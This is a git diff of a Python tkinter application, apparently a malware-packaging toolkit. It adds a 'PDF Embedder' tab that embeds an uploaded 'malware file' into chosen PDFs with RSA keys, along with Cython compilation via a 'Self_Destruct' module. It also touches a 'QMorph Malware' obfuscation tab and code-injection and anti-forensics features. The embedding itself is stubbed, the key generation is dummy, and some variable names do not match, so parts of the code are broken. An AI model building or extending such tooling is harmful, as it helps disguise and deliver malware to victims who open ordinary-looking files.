@@ -1,9 +1,11 @@
 import tkinter as tk
-from tkinter import filedialog, messagebox, StringVar, BooleanVar, ttk
+from tkinter import filedialog, messagebox, StringVar, BooleanVar, ttk, Checkbutton, IntVar
 import os
 import Code_Embedding.code_embedder as ce
 import Quantum_Polymorphism.QMorph as qm
 import glob  # For file pattern matching
+# import Anti_Decompilation.Cython.compiler as adc
+from pathlib import Path
 
 
 class ToolTip:
@@ -63,6 +65,7 @@ class CodeEmbedderApp:
         self.create_excel_macro_tab()
         self.create_qmorph_tab()
         self.create_cython_tab()
+        self.create_embed_in_pdf_tab()
 
     def extract_functions_and_imports(self, filepath):
         """Extract function definitions from the uploaded code file."""
@@ -308,7 +311,8 @@ class CodeEmbedderApp:
             return
 
         # Prepare lists of embed code filenames and function names
-        embed_code_filenames = [os.path.join(self.anti_forensics_dir, f"{func.split('call_')[1]}.py") for func in selected_checks]
+        embed_code_filenames = [os.path.join(self.anti_forensics_dir, f"{func.split('call_')[1]}.py") for func in
+                                selected_checks]
         print(f"{embed_code_filenames} ")
         func_names = [func for func in selected_checks]  # Assuming func is already the function name
 
@@ -549,11 +553,319 @@ class CodeEmbedderApp:
         self.notebook.add(self.excel_macro_frame, text="Macro Excel Creator")
         ttk.Label(self.excel_macro_frame, text="Excel Macro Creator will go here.").grid(row=0, column=0, sticky="nsew")
 
+    def create_embed_in_pdf_tab(self):
+        """Create the PDF Embedder tab with independent display for PDF embed process."""
+        self.pdf_embed_frame = ttk.Frame(self.notebook, padding="10")
+        self.notebook.add(self.pdf_embed_frame, text="PDF Embedder")
+
+        # Variables for PDF embedder inputs
+        self.malware_code_path_pdf = ""  # Unique variable for PDF Embedder
+        self.selected_public_key_pdf = StringVar()
+        self.pdf_folder_path = ""
+        self.pdf_files_selected = {}
+
+        # Top frame for malware file upload in PDF Embedder
+        top_frame_pdf = ttk.Frame(self.pdf_embed_frame)
+        top_frame_pdf.grid(row=0, column=0, sticky="ew", padx=10, pady=10)
+
+        # Malware File upload section
+        ttk.Label(top_frame_pdf, text="Malware File:").grid(row=0, column=0, sticky="w")
+        self.malware_upload_btn_pdf = ttk.Button(top_frame_pdf, text="Upload Malware File",
+                                                 command=self.load_malware_file_pdf)
+        self.malware_upload_btn_pdf.grid(row=0, column=1, sticky="ew", padx=5)
+        self.show_malware_btn_pdf = ttk.Button(top_frame_pdf, text="Show Malware Code",
+                                               command=self.show_malware_code_pdf)
+        self.show_malware_btn_pdf.grid(row=0, column=2, sticky="ew", padx=5)
+
+        # Tooltip for Malware File upload in PDF Embedder
+        info_icon_malware_pdf = tk.Label(top_frame_pdf, text="ℹ️", font=("Arial", 14), cursor="hand2")
+        info_icon_malware_pdf.grid(row=0, column=3, sticky="w", padx=5)
+        malware_tooltip_text_pdf = "Upload a .py malware file to embed in PDF files."
+        ToolTip(info_icon_malware_pdf, malware_tooltip_text_pdf)
+
+        # Status Label for upload success/failure
+        self.upload_status_label_pdf = ttk.Label(top_frame_pdf, text="No file uploaded.", foreground="blue")
+        self.upload_status_label_pdf.grid(row=1, column=0, columnspan=4, sticky="w", padx=5, pady=5)
+
+        # RSA Key Selection and Generation section in PDF Embedder
+        ttk.Label(top_frame_pdf, text="Public Key:").grid(row=2, column=0, sticky="w")
+        self.keypair_dropdown_pdf = ttk.OptionMenu(top_frame_pdf, self.selected_public_key_pdf, "")
+        self.keypair_dropdown_pdf.grid(row=2, column=1, sticky="ew", padx=5)
+        self.generate_keypair_btn_pdf = ttk.Button(top_frame_pdf, text="Generate RSA Key Pair",
+                                                   command=self.generate_rsa_keypair_pdf)
+        self.generate_keypair_btn_pdf.grid(row=2, column=2, sticky="ew", padx=5)
+
+        # Tooltip for RSA Key generation in PDF Embedder
+        info_icon_key_pdf = tk.Label(top_frame_pdf, text="ℹ️", font=("Arial", 14), cursor="hand2")
+        info_icon_key_pdf.grid(row=2, column=3, sticky="w", padx=5)
+        keypair_tooltip_text_pdf = "Generate or select an RSA key pair for embedding in PDFs."
+        ToolTip(info_icon_key_pdf, keypair_tooltip_text_pdf)
+
+        # PDF Folder selection for input files
+        ttk.Label(top_frame_pdf, text="PDF Input Folder:").grid(row=3, column=0, sticky="w")
+        self.folder_select_btn_pdf = ttk.Button(top_frame_pdf, text="Select Folder", command=self.select_pdf_folder_pdf)
+        self.folder_select_btn_pdf.grid(row=3, column=1, sticky="ew", padx=5)
+
+        # Tooltip for PDF Input Folder selection
+        info_icon_folder_pdf = tk.Label(top_frame_pdf, text="ℹ️", font=("Arial", 14), cursor="hand2")
+        info_icon_folder_pdf.grid(row=3, column=3, sticky="w", padx=5)
+        folder_tooltip_text_pdf = "Choose the folder containing PDF files to embed the malware into."
+        ToolTip(info_icon_folder_pdf, folder_tooltip_text_pdf)
+
+        # PDF Checkboxes frame for file selection
+        self.pdf_checkboxes_frame_pdf = ttk.Frame(self.pdf_embed_frame)
+        self.pdf_checkboxes_frame_pdf.grid(row=1, column=0, sticky="nsew", padx=10, pady=10)
+
+        # Submit button and output result box for PDF Embedder
+        self.submit_pdf_embed_btn = ttk.Button(self.pdf_embed_frame, text="Submit", command=self.submit_pdf_embed,
+                                               padding=10)
+        self.submit_pdf_embed_btn.grid(row=2, column=0, sticky="ew", pady=10)
+
+        # Unique Text box for displaying results in PDF Embedder tab
+        self.result_box_pdf_embed = tk.Text(self.pdf_embed_frame, wrap=tk.WORD, background="#d9f0f0", height=10)
+        self.result_box_pdf_embed.grid(row=3, column=0, sticky="nsew", padx=10, pady=10)
+
+        # Status area for showing messages like key generation or upload success in PDF Embedder
+        self.keygen_status_label_pdf = ttk.Label(self.pdf_embed_frame, text="", foreground="green")
+        self.keygen_status_label_pdf.grid(row=4, column=0, sticky="w", padx=10, pady=5)
+
+        output_dir = "Output"
+        os.makedirs(output_dir, exist_ok=True)
+
+        # Detect existing public keys
+        pub_keys = list(Path(output_dir).glob("*.pub"))
+
+        # Update the dropdown with existing keys
+        self.update_keypair_dropdown_pdf(pub_keys)
+
+    def load_malware_file_pdf(self):
+        """Load the malware code file specifically for PDF Embedder."""
+        self.malware_code_path_pdf = filedialog.askopenfilename(
+            title="Select Malware File",
+            filetypes=[("Python files", "*.py")]
+        )
+        if self.malware_code_path_pdf:
+            # Update success status label
+            self.upload_status_label_pdf.config(text=f"Uploaded: {os.path.basename(self.malware_code_path_pdf)}")
+
+            # Display uploaded code in the PDF embedder result box
+            with open(self.malware_code_path_pdf, 'r') as f:
+                code_content = f.read()
+            self.result_box_pdf_embed.delete(1.0, tk.END)
+            self.result_box_pdf_embed.insert(tk.END, f"Loaded Malware Code for PDF Embed:\n{code_content}\n")
+
+    def generate_rsa_keypair_pdf(self):
+        """Generate an RSA keypair if not existing and update the dropdown specifically for PDF Embedder."""
+        output_dir = "Output"
+        os.makedirs(output_dir, exist_ok=True)
+
+        # Detect existing public keys
+        pub_keys = list(Path(output_dir).glob("*.pub"))
+
+        # Update the dropdown with existing keys
+        self.update_keypair_dropdown_pdf(pub_keys)
+
+        # Generate new RSA key pair only if none exist or if user opts to create a new one
+        if not pub_keys or messagebox.askyesno("Generate New Key", "No key pair found. Generate new key pair?"):
+            counter = 0
+            private_key = Path(output_dir, f"keypair_{counter}")
+            public_key = private_key.with_suffix(".pub")
+
+            # Ensure no overwrite by checking for unique file names
+            while private_key.exists() or public_key.exists():
+                counter += 1
+                private_key = Path(output_dir, f"keypair_{counter}")
+                public_key = private_key.with_suffix(".pub")
+
+            # Generate RSA key pair content (dummy example)
+            private_key.write_text("PRIVATE_KEY_CONTENT")
+            public_key.write_text("PUBLIC_KEY_CONTENT")
+
+            # Update key pair dropdown and show success message
+            self.update_keypair_dropdown_pdf([public_key])
+            self.keygen_status_label_pdf.config(text=f"Generated keypair: {public_key.name}")
+            self.keygen_status_label_pdf.update_idletasks()
+
+    def update_keypair_dropdown_pdf(self, pub_keys):
+        """Update dropdown menu with available public keys in Output folder for PDF Embedder."""
+        menu = self.keypair_dropdown_pdf["menu"]
+        menu.delete(0, "end")
+
+        # Populate dropdown with each available key
+        for key in pub_keys:
+            menu.add_command(label=key.name, command=lambda value=key.name: self.selected_public_key_pdf.set(value))
+
+        if pub_keys:
+            # Set the first key as default if any exist
+            self.selected_public_key_pdf.set(pub_keys[0].name)
+        else:
+            self.selected_public_key_pdf.set("No keys available")
+
+    def show_malware_code_pdf(self):
+        """Display the malware code in a text box."""
+        if self.malware_code_path_pdf:
+            with open(self.malware_code_path_pdf, 'r') as f:
+                code_content = f.read()
+            self.result_box_pdf_embed.delete(1.0, tk.END)
+            self.result_box_pdf_embed.insert(tk.END, code_content)
+        else:
+            messagebox.showerror("Error", "No malware file uploaded.")
+
+    def select_pdf_folder_pdf(self):
+        """Select folder containing PDFs and display available files as checkboxes."""
+        self.pdf_folder_path = filedialog.askdirectory(title="Select PDF Folder")
+        if self.pdf_folder_path:
+            for widget in self.pdf_checkboxes_frame.winfo_children():
+                widget.destroy()
+
+            # Display PDFs as checkboxes
+            pdf_files = [f for f in os.listdir(self.pdf_folder_path) if f.endswith(".pdf")]
+            self.pdf_files_selected = {}
+            for i, pdf_file in enumerate(pdf_files):
+                var = IntVar(value=0)
+                checkbox = Checkbutton(self.pdf_checkboxes_frame, text=pdf_file, variable=var)
+                checkbox.grid(row=i, column=0, sticky="w")
+                self.pdf_files_selected[pdf_file] = var
+
+    def submit_pdf_embed(self):
+        """Submit the PDF files for embedding."""
+        selected_pdfs = [f for f, var in self.pdf_files_selected.items() if var.get() == 1]
+        if not self.malware_code_path_pdf:
+            messagebox.showerror("Error", "Please upload a malware file.")
+            return
+        if not selected_pdfs:
+            messagebox.showerror("Error", "Please select at least one PDF file.")
+            return
+        if not self.selected_public_key.get():
+            messagebox.showerror("Error", "Please select or generate an RSA key pair.")
+            return
+
+        public_key_path = os.path.join("Output", self.selected_public_key.get())
+        output_folder = Path("Output/embedded_files")
+        output_folder.mkdir(parents=True, exist_ok=True)
+
+        # Call your embed_in_pdf function here
+        success = True  # Replace with the actual call to `embed_in_pdf`
+        if success:
+            output_files = [output_folder / pdf for pdf in selected_pdfs]
+            self.result_box_pdf_embed.delete(1.0, tk.END)
+            self.result_box_pdf_embed.insert(tk.END, "Embedding successful!\nFiles saved to:\n")
+            for file in output_files:
+                self.result_box_pdf_embed.insert(tk.END, f"{file}\n")
+            self.result_box_pdf_embed.insert(tk.END, "\nTo extract the malware, use:\n")
+            self.result_box_pdf_embed.insert(tk.END,
+                                             "Usage:\npython extract_pdf_rsa.py <private_key.pem> <pdf_file_1> <pdf_file_2> ... <output_python_file>\n")
+        else:
+            self.result_box_pdf_embed.insert(tk.END, "An error occurred during PDF embedding.")
+
     def create_cython_tab(self):
-        """Create the Compile with Cython tab (Placeholder)."""
+        """Create the Compile with Cython tab for taking a Python file input, showing code, and compiling with Cython."""
         self.cython_frame = ttk.Frame(self.notebook, padding="10")
         self.notebook.add(self.cython_frame, text="Compile with Cython")
-        ttk.Label(self.cython_frame, text="Cython compilation will go here.").grid(row=0, column=0, sticky="nsew")
+
+        # Initialize variables
+        self.cython_code_path = ""
+        self.cython_output_file_name = StringVar(value="")
+
+        # Top Frame for file uploading and showing code
+        top_frame = ttk.Frame(self.cython_frame)
+        top_frame.grid(row=0, column=0, sticky="ew")
+        top_frame.columnconfigure(1, weight=1)
+
+        # Python File Upload Section
+        ttk.Label(top_frame, text="Python File to Compile:").grid(row=0, column=0, sticky="w", padx=5, pady=5)
+        self.upload_cython_file_btn = ttk.Button(top_frame, text="Upload Python File", command=self.load_cython_file)
+        self.upload_cython_file_btn.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
+
+        # Info Icon and Tooltip for Upload
+        info_icon = tk.Label(top_frame, text="ℹ️", font=("Arial", 14), cursor="hand2")
+        info_icon.grid(row=0, column=2, sticky="w", padx=5, pady=5)
+        cython_tooltip_text = "Upload a .py file to compile with Cython. Only .py files are accepted."
+        cython_tooltip = ToolTip(info_icon, cython_tooltip_text)
+
+        # Display Box for code preview
+        self.code_display_box_cython = tk.Text(self.cython_frame, wrap=tk.WORD, background="#f0f0f0", height=10)
+        self.code_display_box_cython.grid(row=1, column=0, sticky="nsew", padx=10, pady=10)
+
+        # Middle Frame for output file name and options
+        middle_frame = ttk.Frame(self.cython_frame)
+        middle_frame.grid(row=2, column=0, sticky="ew", padx=10, pady=10)
+        middle_frame.columnconfigure(1, weight=1)
+
+        # Output File Name Entry
+        ttk.Label(middle_frame, text="Output File Name (.pyc):").grid(row=0, column=0, sticky="e", padx=5, pady=5)
+        self.file_name_entry_cython = ttk.Entry(middle_frame, textvariable=self.cython_output_file_name)
+        self.file_name_entry_cython.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
+
+        # Submit Button
+        self.cython_submit_btn = ttk.Button(self.cython_frame, text="Submit", command=self.submit_cython, padding=10)
+        self.cython_submit_btn.grid(row=3, column=0, pady=10, sticky="ew")
+
+        # Result display box for compilation output
+        self.result_box_cython = tk.Text(self.cython_frame, wrap=tk.WORD, background="#d9f0f0", height=10)
+        self.result_box_cython.grid(row=4, column=0, sticky="nsew", padx=10, pady=10)
+
+    def load_cython_file(self):
+        """Load the Python file for Cython compilation."""
+        self.cython_code_path = filedialog.askopenfilename(
+            title="Select Python File to Compile",
+            filetypes=[("Python files", "*.py")]
+        )
+        if self.cython_code_path:
+            with open(self.cython_code_path, 'r') as f:
+                code_content = f.read()
+            self.code_display_box_cython.delete(1.0, tk.END)
+            self.code_display_box_cython.insert(tk.END, code_content)
+
+    def submit_cython(self):
+        """Submit the file for compilation with Cython."""
+        input_file = self.cython_code_path
+        output_file = self.cython_output_file_name.get().strip()
+
+        if not input_file:
+            messagebox.showerror("Error", "Please upload a Python file to compile.")
+            return
+
+        # Check if output file has .pyc extension, if not, add it
+        if not output_file.endswith(".pyc"):
+            output_file += ".pyc"
+
+        # If no output file name specified, generate default unique name
+        if not output_file or output_file == ".pyc":
+            base_name = "CythonCompiled"
+            counter = 0
+            while os.path.exists(f"Output/{base_name}{counter}.pyc"):
+                counter += 1
+            output_file = f"{base_name}{counter}.pyc"
+
+        # Create output directory if it doesn't exist
+        os.makedirs("Output", exist_ok=True)
+        output_path = os.path.join("Output", output_file)
+
+        # Run the cython compiler
+        success, location = self.cython_compiler(input_file, output_path)
+        # success = adc.compile_with_cython(input_file, output_path)
+
+        # Display results
+        self.result_box_cython.delete(1.0, tk.END)
+        if success:
+            self.result_box_cython.insert(tk.END, f"Compilation Successful!\nOutput saved to: {output_path}")
+        else:
+            self.result_box_cython.insert(tk.END, "An error occurred during compilation.")
+
+    def cython_compiler(self, input_file, output_file):
+        """Compile a Python file using Cython to produce a .pyc output."""
+        try:
+            from Self_Destruct.compile import compile_with_cython
+            # Actual Cython compilation call, replace with your import and actual call from compile.py
+            location = compile_with_cython(input_file, output_file)  # Replace with actual function call
+            if location is not None:
+                return True, location
+            else:
+                return False, None
+        except Exception as e:
+            print(f"Compilation Error: {e}")
+            return False, None
 
     def create_qmorph_tab(self):
         """Create the QMorph Malware tab."""
@@ -561,7 +873,7 @@ class CodeEmbedderApp:
         self.notebook.add(self.qmorph_frame, text="QMorph Malware")
 
         # Initialize variables
-        self.malware_code_path = ""
+        self.malware_code_path_qmorph = ""
 
         # Top Frame for file uploading and showing code
         top_frame = ttk.Frame(self.qmorph_frame)
@@ -575,7 +887,7 @@ class CodeEmbedderApp:
         )
         self.upload_malware_btn.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
         self.show_malware_btn = ttk.Button(
-            top_frame, text="Show Code", command=self.show_malware_code
+            top_frame, text="Show Code", command=self.show_malware_code_qmorph
         )
         self.show_malware_btn.grid(row=0, column=2, sticky="ew", padx=5, pady=5)
 
@@ -617,18 +929,18 @@ class CodeEmbedderApp:
             filetypes=[("Python files", "*.py")],
         )
         if filepath:
-            self.malware_code_path = filepath
+            self.malware_code_path_qmorph = filepath
             self.code_display_box_qmorph.delete(1.0, tk.END)
             self.code_display_box_qmorph.insert(tk.END,
-                                                f"Successfully uploaded: {os.path.basename(self.malware_code_path)}")
+                                                f"Successfully uploaded: {os.path.basename(self.malware_code_path_qmorph)}")
             # Clear previous result
             self.result_box_qmorph.delete(1.0, tk.END)
 
-    def show_malware_code(self):
+    def show_malware_code_qmorph(self):
         """Display the content of the uploaded malware code file in QMorph tab."""
-        if self.malware_code_path:
+        if self.malware_code_path_qmorph:
             try:
-                with open(self.malware_code_path, 'r') as f:
+                with open(self.malware_code_path_qmorph, 'r') as f:
                     code_content = f.read()
                 self.code_display_box_qmorph.delete(1.0, tk.END)
                 self.code_display_box_qmorph.insert(tk.END, code_content)
@@ -639,11 +951,11 @@ class CodeEmbedderApp:
 
     def submit_qmorph(self):
         """Process the QMorph obfuscation and display the result."""
-        if not self.malware_code_path:
+        if not self.malware_code_path_qmorph:
             messagebox.showerror("Error", "Please upload the malware code file before submitting.")
             return
 
-        success, output_file = qm.QMorph(self.malware_code_path)
+        success, output_file = qm.QMorph(self.malware_code_path_qmorph)
 
         # Display the result
         self.result_box_qmorph.delete(1.0, tk.END)
@@ -668,7 +980,7 @@ class CodeEmbedderApp:
         """Perform the embedding process and display the final code output for Custom mode."""
         new_name = self.new_file_name_custom.get()
         if new_name != "Output/Innocent.py" and new_name != "":
-            new_name = "Output/" +new_name
+            new_name = "Output/" + new_name
         loc_to_inject = self.loc_to_inject_custom.get()
         func_name = self.selected_function_custom.get()
         wrap = self.wrap_custom.get()
@@ -785,8 +1097,6 @@ class CodeEmbedderApp:
         for name in function_names:
             menu.add_command(label=name, command=lambda value=name: self.selected_function_custom.set(value))
 
-
-# --- End of CodeEmbedderApp Class ---
 
 if __name__ == "__main__":
     root = tk.Tk()
